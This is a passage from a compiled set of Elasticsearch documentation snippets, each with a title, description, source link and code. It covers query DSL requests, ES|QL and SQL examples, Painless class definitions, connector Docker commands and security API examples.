\"aggs\": {\n    \"range\": {\n      \"date_range\": {\n        \"field\": \"date\",\n        \"format\": \"MM-yyy\",\n        \"ranges\": [\n          { \"from\": \"01-2015\", \"to\": \"03-2015\", \"key\": \"quarter_01\" },\n          { \"from\": \"03-2015\", \"to\": \"06-2015\", \"key\": \"quarter_02\" }\n        ],\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Embedding Examples in Asciidoc Documentation\nDESCRIPTION: Demonstrates how to include CSV-SPEC test snippets in Elasticsearch documentation using asciidoc syntax with tagged regions and include directives\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/testFixtures/src/main/resources/README.md#2025-04-21_snippet_0\n\nLANGUAGE: asciidoc\nCODE:\n```\n[source.merge.styled,esql]\n----\ninclude::{esql-specs}/floats.csv-spec[tag=sin]\n----\n[%header.monospaced.styled,format=dsv,separator=|]\n|===\ninclude::{esql-specs}/floats.csv-spec[tag=sin-result]\n|===\n```\n\n----------------------------------------\n\nTITLE: Creating Index for Pre-indexed Shapes\nDESCRIPTION: This code snippet shows how to create an Elasticsearch index to store pre-indexed shapes. The index `shapes` is created with a `geo_shape` field called `location`. This allows storing shapes that can be referenced in other queries by ID.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT /shapes\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Source Document to Elasticsearch Bulk Request\nDESCRIPTION: Method to add a document with specified index, type, and ID to the bulk request with source content provided in various formats. This is a convenience method for creating and adding an IndexRequest.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic BulkRequest add(String index, String type, String id, Object source) {\n    return add(new IndexRequest(index, type, id).source(source));\n}\n```\n\n----------------------------------------\n\nTITLE: Running Elastic Connectors Docker Image\nDESCRIPTION: This command runs the Elastic Connectors Docker image, mounting a local directory containing the configuration file to the /config directory inside the container.  It also sets up networking and specifies the command to start the connector service. The user must replace the placeholder with the absolute path to their configuration directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-run-from-docker.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v \"</absolute/path/to>/connectors-config:/config\" \\# NOTE: you must change this path to match where the config.yml is located\n--rm \\\n--tty -i \\\n--network host \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Geo Distance Sorting in Elasticsearch\nDESCRIPTION: Basic example of geo-distance sorting using coordinates with various parameters like unit, mode, and distance_type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\" : [\n    {\n      \"_geo_distance\" : {\n          \"pin.location\" : [-70, 40],\n          \"order\" : \"asc\",\n          \"unit\" : \"km\",\n          \"mode\" : \"min\",\n          \"distance_type\" : \"arc\",\n          \"ignore_unmapped\": true\n      }\n    }\n  ],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining French Stop Words\nDESCRIPTION: Defines French stop words for analyzing text in Elasticsearch, linking to the related Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_18\n\nLANGUAGE: markdown\nCODE:\n```\n`_french_`\n:   [French stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/french_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Docker Container Deployment\nDESCRIPTION: Docker run command to deploy the Google Cloud Storage connector service with mounted configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-cloud.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Implicit Type Casting Query in ESQL\nDESCRIPTION: Example query demonstrating implicit type casting where the string date literal is automatically converted to datetime without explicit to_datetime() function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-implicit-casting.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL dd_ns1=date_diff(\"day\", \"2023-12-02T11:00:00.00Z\", birth_date)\n| SORT emp_no\n| KEEP dd_ns1\n| LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Defining Binary Field Mapping in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to define a mapping with a binary field and how to index a document with a Base64 encoded binary value. The binary field is not stored by default and is not searchable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/binary.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": {\n        \"type\": \"text\"\n      },\n      \"blob\": {\n        \"type\": \"binary\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"name\": \"Some binary blob\",\n  \"blob\": \"U29tZSBiaW5hcnkgYmxvYg==\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Numeric Type Mappings Table\nDESCRIPTION: Markdown table showing the mapping between numeric input types and their corresponding result types in ESQL functions. Includes double, integer, long, and unsigned_long types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | integer |\n| long | long |\n| unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: Parsing Time Strings in SQL\nDESCRIPTION: The TIME_PARSE function parses a time string using a specified format pattern. It returns a time value and requires only time components in the input string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_47\n\nLANGUAGE: sql\nCODE:\n```\nTIME_PARSE(\n    string_exp, <1>\n    string_exp) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TIME_PARSE('10:20:30.123', 'HH:mm:ss.SSS') AS \"time\";\n\n     time\n---------------\n10:20:30.123Z\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TIME_PARSE('10:20:30-01:00', 'HH:mm:ssXXX') AS \"time\";\n\n     time\n---------------\n11:20:30.000Z\n```\n\n----------------------------------------\n\nTITLE: Single Source Composite Aggregation in Elasticsearch\nDESCRIPTION: This example shows a composite aggregation with a single source using the terms aggregation on the user_name field. It demonstrates how the aggregation can be optimized when it matches the index sort.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"user_name\": { \"terms\": { \"field\": \"user_name\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Nested Mapping for Sales Index in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a mapping for a 'sales' index with nested comments. It defines 'tags' as a keyword field and 'comments' as a nested field with 'username' and 'comment' properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-hits-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /sales\n{\n  \"mappings\": {\n    \"properties\": {\n      \"tags\": { \"type\": \"keyword\" },\n      \"comments\": {                           <1>\n        \"type\": \"nested\",\n        \"properties\": {\n          \"username\": { \"type\": \"keyword\" },\n          \"comment\": { \"type\": \"text\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Elasticsearch Weighted Average Aggregation\nDESCRIPTION: This example demonstrates how to use the 'missing' parameter to specify default values for documents with missing or null values in the weighted_avg aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-weight-avg-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"weighted_grade\": {\n      \"weighted_avg\": {\n        \"value\": {\n          \"field\": \"grade\",\n          \"missing\": 2\n        },\n        \"weight\": {\n          \"field\": \"weight\",\n          \"missing\": 3\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using RTRIM Function in Elasticsearch SQL\nDESCRIPTION: Returns the characters of a string expression with trailing blanks removed. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nRTRIM(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT RTRIM('Elastic   ');\n\nRTRIM('Elastic   ')\n-------------------\nElastic\n```\n\n----------------------------------------\n\nTITLE: Aggregating and Sorting Employee Data with ESQL\nDESCRIPTION: This ESQL query counts employees grouped by the first letter of their last name and sorts the results. It uses the COUNT() function for aggregation, the LEFT() function to extract the first letter, and the SORT clause for ordering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/docsStatsByExpression.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS my_count = COUNT() BY LEFT(last_name, 1)\n| SORT `LEFT(last_name, 1)`\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Inline GeoShape Definition\nDESCRIPTION: This code snippet shows how to query Elasticsearch using an inline `geo_shape` definition.  It uses the `envelope` GeoJSON extension to define a bounding box and searches for documents within that box. The `relation` parameter specifies the spatial relationship to search for (in this case, `within`).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /example/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_shape\": {\n          \"location\": {\n            \"shape\": {\n              \"type\": \"envelope\",\n              \"coordinates\": [ [ 13.0, 53.0 ], [ 14.0, 52.0 ] ]\n            },\n            \"relation\": \"within\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Bitwise OR Operation with Different Integer Types\nDESCRIPTION: Example showing bitwise OR operations between values of different integer types. The snippet demonstrates type promotion from int to long and how the operations are evaluated.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_36\n\nLANGUAGE: painless\nCODE:\n```\nint i = 5 | 6;   <1>\nlong l = i | 8L; <2>\n```\n\n----------------------------------------\n\nTITLE: Configuring Boolean Query Clause Count\nDESCRIPTION: Dynamic setting that controls maximum number of boolean clauses in a query based on heap size and thread pool size. Minimum value is 1024.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/search-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: properties\nCODE:\n```\nindices.query.bool.max_clause_count\n```\n\n----------------------------------------\n\nTITLE: Certificate Generation Command Synopsis - Shell\nDESCRIPTION: Command line syntax for the elasticsearch-certgen tool showing all available parameters and options for generating certificates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certgen.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-certgen\n(([--cert <cert_file>] [--days <n>] [--dn <name>] [--key <key_file>]\n[--keysize <bits>] [--pass <password>] [--p12 <password>])\n| [--csr])\n[-E <KeyValuePair>] [-h, --help] [--in <input_file>] [--out <output_file>]\n([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Defining Index Mapping for Sensor Data\nDESCRIPTION: This snippet shows how to create an index mapping for sensor data, including fields for timestamp, model number, and voltage as a nested field under measures.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"model_number\": {\n        \"type\": \"keyword\"\n      },\n      \"measures\": {\n        \"properties\": {\n          \"voltage\": {\n            \"type\": \"double\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.Comparator Methods in Painless\nDESCRIPTION: This snippet defines methods for the java.util.Comparator interface, enabling the comparison of objects in the Painless scripting language. It includes various comparison methods and mechanisms for establishing natural order and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Comparator {\n  int compare(def,def)\n  Comparator comparing(Function)\n  Comparator comparing(Function,Comparator)\n  Comparator comparingDouble(ToDoubleFunction)\n  Comparator comparingInt(ToIntFunction)\n  Comparator comparingLong(ToLongFunction)\n  boolean equals(Object)\n  Comparator naturalOrder()\n  Comparator nullsFirst(Comparator)\n  Comparator nullsLast(Comparator)\n  Comparator reversed()\n  Comparator reverseOrder()\n  Comparator thenComparing(Comparator)\n  Comparator thenComparing(Function,Comparator)\n  Comparator thenComparingDouble(ToDoubleFunction)\n  Comparator thenComparingInt(ToIntFunction)\n  Comparator thenComparingLong(ToLongFunction)\n}\n```\n\n----------------------------------------\n\nTITLE: Limiting Supported Operators with Flags\nDESCRIPTION: Demonstrates how to limit supported operators for a simple query string using the flags parameter. The flags parameter enables selective usage of operators like OR, AND, and PREFIX, by using a '|' separator. Elasticsearch requirements apply, with no additional setup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-simple-query-string-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"simple_query_string\": {\n      \"query\": \"foo | bar + baz*\",\n      \"flags\": \"OR|AND|PREFIX\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents with Rank Features\nDESCRIPTION: This snippet shows how to index documents into the test index set up previously. The documents include rank feature fields such as pagerank, url_length, and topics, which are used for enhancing search relevance scores. Each document is indexed with a specific ID and refresh parameter to make it searchable immediately.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /test/_doc/1?refresh\n{\n  \"url\": \"https://en.wikipedia.org/wiki/2016_Summer_Olympics\",\n  \"content\": \"Rio 2016\",\n  \"pagerank\": 50.3,\n  \"url_length\": 42,\n  \"topics\": {\n    \"sports\": 50,\n    \"brazil\": 30\n  }\n}\n\nPUT /test/_doc/2?refresh\n{\n  \"url\": \"https://en.wikipedia.org/wiki/2016_Brazilian_Grand_Prix\",\n  \"content\": \"Formula One motor race held on 13 November 2016\",\n  \"pagerank\": 50.3,\n  \"url_length\": 47,\n  \"topics\": {\n    \"sports\": 35,\n    \"formula one\": 65,\n    \"brazil\": 20\n  }\n}\n\nPUT /test/_doc/3?refresh\n{\n  \"url\": \"https://en.wikipedia.org/wiki/Deadpool_(film)\",\n  \"content\": \"Deadpool is a 2016 American superhero film\",\n  \"pagerank\": 50.3,\n  \"url_length\": 37,\n  \"topics\": {\n    \"movies\": 60,\n    \"super hero\": 65\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Elasticsearch API Key with Multiple Source Access\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch API key that combines access to multiple sources (source1 and source2) with specific read privileges and access control parameters for each source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"my-api-key\",\n  \"role_descriptors\": {\n    \"role-source1\": {\n      \"indices\": [\n        {\n          \"names\": [\"source1\"],\n          \"privileges\": [\"read\"],\n          \"query\": {\n            \"template\": {\n                \"params\": {\n                    \"access_control\": [\n                        \"example.user@example.com\",\n                        \"source1-user-group\"]\n                }\n            },\n            \"source\": \"...\"\n          }\n        }\n      ]\n    },\n    \"role-source2\": {\n      \"indices\": [\n        {\n          \"names\": [\"source2\"],\n          \"privileges\": [\"read\"],\n          \"query\": {\n            \"template\": {\n                \"params\": {\n                    \"access_control\": [\n                        \"example.user@example.com\",\n                        \"source2-user-group\"]\n                }\n            },\n            \"source\": \"...\"\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ST_WITHIN in ESQL\nDESCRIPTION: This ESQL query demonstrates the use of the ST_WITHIN function to determine if a city boundary is within a specified polygon. The query filters the `airport_city_boundaries` dataset, keeping only records where the `city_boundary` is within the polygon defined using TO_GEOSHAPE.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_within.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE ST_WITHIN(city_boundary, TO_GEOSHAPE(\"POLYGON((109.1 18.15, 109.6 18.15, 109.6 18.65, 109.1 18.65, 109.1 18.15))\"))\n| KEEP abbrev, airport, region, city, city_location\n```\n\n----------------------------------------\n\nTITLE: Decay Function with Timestamp Example\nDESCRIPTION: Example of using a Gaussian decay function with a timestamp field, showing date-based origin and scale parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"gauss\": {\n        \"@timestamp\": {\n          \"origin\": \"2013-09-17\",\n          \"scale\": \"10d\",\n          \"offset\": \"5d\",\n          \"decay\": 0.5\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Decay Function for Date Fields\nDESCRIPTION: This snippet demonstrates using the `decayDateGauss` function within a script. It uses parameters such as origin, scale, offset, and decay to calculate the score based on date proximity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"decayDateGauss(params.origin, params.scale, params.offset, params.decay, doc['date'].value)\",\n    \"params\": {\n        \"origin\": \"2008-01-01T01:00:00Z\",\n        \"scale\": \"1h\",\n        \"offset\" : \"0\",\n        \"decay\" : 0.5\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ES|QL Full-text Search Example (Valid)\nDESCRIPTION: This example demonstrates a valid ES|QL query using the MATCH function within a WHERE clause directly after the FROM clause.  It showcases the correct placement of the MATCH function for full-text search to avoid validation errors. The query searches for books where the author matches \"Faulkner\" AND \"Tolkien\".\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\n\nFROM books\n| WHERE MATCH(author, \"Faulkner\") AND MATCH(author, \"Tolkien\")\n\n```\n\n----------------------------------------\n\nTITLE: Creating Role Descriptor with Global Application and Profile Management in Elasticsearch\nDESCRIPTION: This role descriptor grants all cluster permissions, global application and profile management with special characters, and role management for specific indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/security/audit/logfile/audited_roles.txt#2025-04-22_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\"cluster\":[\"all\"],\"global\":{\"application\":{\"manage\":{\"applications\":[\"\\\"\"]}},\"profile\":{\"write\":{\"applications\":[\"\",\"\\\"\"]}},\"role\":{\"manage\":{\"indices\":[{\"names\":[\"test*\"],\"privileges\":[\"read\",\"write\"]}]}}},\"indices\":[],\"applications\":[],\"run_as\":[\"\\\"[a]/\"]}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Documentation for a numeric parameter in an ESQL function. The parameter accepts numeric expressions and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/exp.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Calculating Count with ESQL\nDESCRIPTION: This snippet demonstrates how to use the COUNT function in ESQL to count the number of 'height' values in the 'employees' table. The COUNT function is used within a STATS clause to perform the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/count.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS COUNT(height)\n```\n\n----------------------------------------\n\nTITLE: Histogram Value Source Example\nDESCRIPTION: Shows how to use the histogram value source to build fixed-size interval buckets over numeric values. This example creates buckets with an interval of 5 from the price field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"histo\": { \"histogram\": { \"field\": \"price\", \"interval\": 5 } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dense Vector Field with Dot Product Similarity for kNN Search\nDESCRIPTION: This snippet shows how to create a dense vector field optimized for kNN search using the dot_product similarity metric. By default, vector fields are indexed for faster kNN retrieval.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-2\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 3,\n        \"similarity\": \"dot_product\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Search Query with Custom Routing Value in Elasticsearch\nDESCRIPTION: Shows how to perform a search query using a custom routing value to target the specific shard where a document was indexed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-shard-routing.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?routing=my-routing-value\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Type-Specific Buffer Class Definitions\nDESCRIPTION: Defines buffer classes for specific primitive types (Char, Double, Float, Int, Long, Short) with get methods and TODO comments for array operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.nio.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.nio.CharBuffer {\n  char get(int)\n}\n\nclass java.nio.DoubleBuffer {\n  double get(int)\n}\n\nclass java.nio.FloatBuffer {\n  float get(int)\n}\n\nclass java.nio.IntBuffer {\n  int get(int)\n}\n\nclass java.nio.LongBuffer {\n  long get(int)\n}\n\nclass java.nio.ShortBuffer {\n  short get(int)\n}\n```\n\n----------------------------------------\n\nTITLE: Method Call Example in Painless\nDESCRIPTION: Demonstrates how Painless resolves method calls by examining the receiver class, method name, and parameter count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/how-painless-dispatches-function.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\ns.foo(a, b)\n```\n\n----------------------------------------\n\nTITLE: Basic Rule Retriever Example\nDESCRIPTION: Example of using the rule retriever to apply query rules on search results for Harry Potter movies\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET movies/_search\n{\n  \"retriever\": {\n    \"rule\": {\n      \"match_criteria\": {\n        \"query_string\": \"harry potter\"\n      },\n      \"ruleset_ids\": [\n        \"my-ruleset\"\n      ],\n      \"retriever\": {\n        \"standard\": {\n          \"query\": {\n            \"query_string\": {\n              \"query\": \"harry potter\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Query Using Text Field for Exact Matching\nDESCRIPTION: An SQL query example showing how to perform exact matching on a text field. Elasticsearch SQL will automatically use an appropriate keyword multi-field for the comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-data-types.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name FROM index WHERE first_name = 'John'\n```\n\n----------------------------------------\n\nTITLE: Basic Date Truncation with KEEP and EVAL\nDESCRIPTION: Shows how to truncate hire dates to year precision while keeping specific columns. Uses KEEP to select columns and EVAL to create a new column with truncated dates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_trunc.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, hire_date\n| EVAL year_hired = DATE_TRUNC(1 year, hire_date)\n```\n\n----------------------------------------\n\nTITLE: Advanced Cross-Field Query with dis_max and minimum_should_match\nDESCRIPTION: This query demonstrates how to use dis_max to combine multiple cross_fields queries with different configurations, applying minimum_should_match parameter to just one of them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"dis_max\": {\n      \"queries\": [\n        {\n          \"multi_match\" : {\n            \"query\":      \"Will Smith\",\n            \"type\":       \"cross_fields\",\n            \"fields\":     [ \"first\", \"last\" ],\n            \"minimum_should_match\": \"50%\" \n          }\n        },\n        {\n          \"multi_match\" : {\n            \"query\":      \"Will Smith\",\n            \"type\":       \"cross_fields\",\n            \"fields\":     [ \"*.edge\" ]\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering a Query in Percolator\nDESCRIPTION: This snippet shows how to register a query in an Elasticsearch index using the percolator field. It involves storing a JSON object query to be used for matching documents against.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/1?refresh\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"bonsai tree\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing While Loop for Conditional Iteration in Painless\nDESCRIPTION: Demonstrates the use of a while loop in Painless to repeatedly execute a block of code as long as a specified condition is true. It uses the context variable 'ctx._source' to access document fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-statements.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nwhile (ctx._source.item < condition) {\n  // do something\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Async EQL Search Status in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the get async EQL status API to check the status of an asynchronous EQL search in a lightweight manner.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_25\n\nLANGUAGE: console\nCODE:\n```\nGET /_eql/search/status/FmNJRUZ1YWZCU3dHY1BIOUhaenVSRkEaaXFlZ3h4c1RTWFNocDdnY2FSaERnUTozNDE=\n```\n\n----------------------------------------\n\nTITLE: Creating Sequences in EQL\nDESCRIPTION: Shows how to create and use sequences in EQL to match an ordered series of events. Includes examples of using 'maxspan' to constrain sequences to a specific timespan.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_12\n\nLANGUAGE: eql\nCODE:\n```\nsequence\n  [ file where file.extension == \"exe\" ]\n  [ process where true ]\n```\n\nLANGUAGE: eql\nCODE:\n```\nsequence with maxspan=15m\n  [ file where file.extension == \"exe\" ]\n  [ process where true ]\n```\n\n----------------------------------------\n\nTITLE: Negating Queries in YAML using 